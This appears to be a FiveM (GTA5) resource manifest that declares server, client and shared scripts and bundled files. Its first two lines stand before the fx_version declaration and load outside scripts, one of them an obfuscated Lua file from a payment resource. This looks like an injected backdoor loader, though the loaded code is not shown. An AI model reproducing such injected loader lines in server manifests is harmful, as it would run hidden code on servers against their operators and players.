shared_script '@vilasp-payment/ai_module_fg-obfuscated.lua'
server_script "@azat/lib.lua"
fx_version 'adamant'
game 'gta5'

shared_script 'RPC.lua'

server_scripts {
  'server/*',
  'server/frameworks/*',
}

client_scripts {
  'client/*'
}

files {
  'build/**/*',
  'config.json',
}